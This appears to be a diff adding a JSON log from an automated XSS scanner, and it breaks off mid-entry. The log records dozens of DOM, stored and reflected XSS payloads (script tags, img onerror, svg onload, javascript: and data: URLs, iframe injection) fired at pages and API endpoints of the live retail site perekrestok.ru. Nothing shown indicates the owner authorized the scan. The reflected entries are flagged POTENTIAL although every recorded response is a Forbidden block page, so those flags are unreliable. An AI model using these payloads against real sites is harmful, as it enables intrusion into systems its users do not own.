@@ -1,0 +1,772 @@
+[
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/#<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/?deepLink=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27AKUMA_DOM_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/?callback=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27AKUMA_DOM_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/#<svg onload=alert('DOM_AKUMA')>",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/?deepLink=%3Csvg%20onload%3Dalert%28%27DOM_AKUMA%27%29%3E",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/?callback=%3Csvg%20onload%3Dalert%28%27DOM_AKUMA%27%29%3E",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/#javascript:alert('DEEPLINK_XSS')",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/?deepLink=javascript%3Aalert%28%27DEEPLINK_XSS%27%29",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/?callback=javascript%3Aalert%28%27DEEPLINK_XSS%27%29",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/#data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/?deepLink=data%3Atext/html%2C%3Cscript%3Ealert%28%27DATA_URL_XSS%27%29%3C/script%3E",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/?callback=data%3Atext/html%2C%3Cscript%3Ealert%28%27DATA_URL_XSS%27%29%3C/script%3E",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/#<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/?deepLink=%3Ciframe%20src%3D%22javascript%3Aalert%28%27IFRAME_XSS%27%29%22%3E%3C/iframe%3E",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/layouts/DefaultLayout/BellNotification/?callback=%3Ciframe%20src%3D%22javascript%3Aalert%28%27IFRAME_XSS%27%29%22%3E%3C/iframe%3E",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/#<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/?deepLink=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27AKUMA_DOM_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/?callback=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27AKUMA_DOM_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/#<svg onload=alert('DOM_AKUMA')>",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/?deepLink=%3Csvg%20onload%3Dalert%28%27DOM_AKUMA%27%29%3E",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/?callback=%3Csvg%20onload%3Dalert%28%27DOM_AKUMA%27%29%3E",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/#javascript:alert('DEEPLINK_XSS')",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/?deepLink=javascript%3Aalert%28%27DEEPLINK_XSS%27%29",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/?callback=javascript%3Aalert%28%27DEEPLINK_XSS%27%29",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/#data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/?deepLink=data%3Atext/html%2C%3Cscript%3Ealert%28%27DATA_URL_XSS%27%29%3C/script%3E",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/?callback=data%3Atext/html%2C%3Cscript%3Ealert%28%27DATA_URL_XSS%27%29%3C/script%3E",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/#<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/?deepLink=%3Ciframe%20src%3D%22javascript%3Aalert%28%27IFRAME_XSS%27%29%22%3E%3C/iframe%3E",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/mobile5ka/src/pages/TechnicalPages/components/LinksSandbox/?callback=%3Ciframe%20src%3D%22javascript%3Aalert%28%27IFRAME_XSS%27%29%22%3E%3C/iframe%3E",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html#<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html?deepLink=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27AKUMA_DOM_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html?callback=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27AKUMA_DOM_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html#<svg onload=alert('DOM_AKUMA')>",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html?deepLink=%3Csvg%20onload%3Dalert%28%27DOM_AKUMA%27%29%3E",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html?callback=%3Csvg%20onload%3Dalert%28%27DOM_AKUMA%27%29%3E",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html#javascript:alert('DEEPLINK_XSS')",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html?deepLink=javascript%3Aalert%28%27DEEPLINK_XSS%27%29",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html?callback=javascript%3Aalert%28%27DEEPLINK_XSS%27%29",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html#data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html?deepLink=data%3Atext/html%2C%3Cscript%3Ealert%28%27DATA_URL_XSS%27%29%3C/script%3E",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html?callback=data%3Atext/html%2C%3Cscript%3Ealert%28%27DATA_URL_XSS%27%29%3C/script%3E",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html#<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html?deepLink=%3Ciframe%20src%3D%22javascript%3Aalert%28%27IFRAME_XSS%27%29%22%3E%3C/iframe%3E",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/join-by-referral.html?callback=%3Ciframe%20src%3D%22javascript%3Aalert%28%27IFRAME_XSS%27%29%22%3E%3C/iframe%3E",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html#<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html?deepLink=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27AKUMA_DOM_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html?callback=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27AKUMA_DOM_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('AKUMA_DOM_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html#<svg onload=alert('DOM_AKUMA')>",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html?deepLink=%3Csvg%20onload%3Dalert%28%27DOM_AKUMA%27%29%3E",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html?callback=%3Csvg%20onload%3Dalert%28%27DOM_AKUMA%27%29%3E",
+    "payload": "<svg onload=alert('DOM_AKUMA')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html#javascript:alert('DEEPLINK_XSS')",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html?deepLink=javascript%3Aalert%28%27DEEPLINK_XSS%27%29",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html?callback=javascript%3Aalert%28%27DEEPLINK_XSS%27%29",
+    "payload": "javascript:alert('DEEPLINK_XSS')",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html#data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html?deepLink=data%3Atext/html%2C%3Cscript%3Ealert%28%27DATA_URL_XSS%27%29%3C/script%3E",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html?callback=data%3Atext/html%2C%3Cscript%3Ealert%28%27DATA_URL_XSS%27%29%3C/script%3E",
+    "payload": "data:text/html,<script>alert('DATA_URL_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html#<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html?deepLink=%3Ciframe%20src%3D%22javascript%3Aalert%28%27IFRAME_XSS%27%29%22%3E%3C/iframe%3E",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "DOM XSS",
+    "url": "https://www.perekrestok.ru/web-mystery-shopper/deep-link.html?callback=%3Ciframe%20src%3D%22javascript%3Aalert%28%27IFRAME_XSS%27%29%22%3E%3C/iframe%3E",
+    "payload": "<iframe src=\"javascript:alert('IFRAME_XSS')\"></iframe>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/feeds/edadeal/large",
+    "payload": "<script>alert('AKUMA_STORED_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/feeds/edadeal/large",
+    "payload": "<img src=x onerror=alert('STORED_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/feeds/edadeal/large",
+    "payload": "\"><script>alert('QUOTE_ESCAPE_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/feeds/edadeal/large",
+    "payload": "';alert('SQL_XSS');//",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/feeds/edadeal/large",
+    "payload": "<svg/onload=alert('SVG_STORED')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/api/offers",
+    "payload": "<script>alert('AKUMA_STORED_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/api/offers",
+    "payload": "<img src=x onerror=alert('STORED_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/api/offers",
+    "payload": "\"><script>alert('QUOTE_ESCAPE_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/api/offers",
+    "payload": "';alert('SQL_XSS');//",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/api/offers",
+    "payload": "<svg/onload=alert('SVG_STORED')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/api/catalogs",
+    "payload": "<script>alert('AKUMA_STORED_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/api/catalogs",
+    "payload": "<img src=x onerror=alert('STORED_XSS')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/api/catalogs",
+    "payload": "\"><script>alert('QUOTE_ESCAPE_XSS')</script>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/api/catalogs",
+    "payload": "';alert('SQL_XSS');//",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "STORED XSS",
+    "url": "https://www.perekrestok.ru/api/catalogs",
+    "payload": "<svg/onload=alert('SVG_STORED')>",
+    "status": "SAFE",
+    "response": ""
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?q=%3Cscript%3Ealert%28%27AKUMA_REFLECTED%27%29%3C/script%3E",
+    "payload": "<script>alert('AKUMA_REFLECTED')</script>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27REFLECTED_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('REFLECTED_XSS')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?q=%22%3E%3Cscript%3Ealert%28%27HEADER_XSS%27%29%3C/script%3E%3C%21--",
+    "payload": "\"><script>alert('HEADER_XSS')</script><!--",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?q=%3Csvg%20onload%3Dconfirm%28%27REFLECTED_CONFIRM%27%29%3E",
+    "payload": "<svg onload=confirm('REFLECTED_CONFIRM')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?q=javascript%3Aalert%28%27URL_REFLECTED%27%29",
+    "payload": "javascript:alert('URL_REFLECTED')",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?search=%3Cscript%3Ealert%28%27AKUMA_REFLECTED%27%29%3C/script%3E",
+    "payload": "<script>alert('AKUMA_REFLECTED')</script>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?search=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27REFLECTED_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('REFLECTED_XSS')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?search=%22%3E%3Cscript%3Ealert%28%27HEADER_XSS%27%29%3C/script%3E%3C%21--",
+    "payload": "\"><script>alert('HEADER_XSS')</script><!--",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?search=%3Csvg%20onload%3Dconfirm%28%27REFLECTED_CONFIRM%27%29%3E",
+    "payload": "<svg onload=confirm('REFLECTED_CONFIRM')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?search=javascript%3Aalert%28%27URL_REFLECTED%27%29",
+    "payload": "javascript:alert('URL_REFLECTED')",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?query=%3Cscript%3Ealert%28%27AKUMA_REFLECTED%27%29%3C/script%3E",
+    "payload": "<script>alert('AKUMA_REFLECTED')</script>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?query=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27REFLECTED_XSS%27%29%3E",
+    "payload": "<img src=x onerror=alert('REFLECTED_XSS')>",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?query=%22%3E%3Cscript%3Ealert%28%27HEADER_XSS%27%29%3C/script%3E%3C%21--",
+    "payload": "\"><script>alert('HEADER_XSS')</script><!--",
+    "status": "POTENTIAL",
+    "response": "<!DOCTYPE html>\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body>\n  <div style=\"text-align: center;\">\n    <h1>Forbidden</h1>\n    <p id=\"REQUEST-DATE\">D..."
+  },
+  {
+    "test_type": "REFLECTED XSS",
+    "url": "https://www.perekrestok.ru/status?query=%3Csvg%20onload%3Dconfirm%28%27REFLECTED_CONFIRM%27%29%3E",
+    "payload": "<svg onload=confirm('REFLECTED_CONFIRM')>",
+    "status": "POTENTIAL",
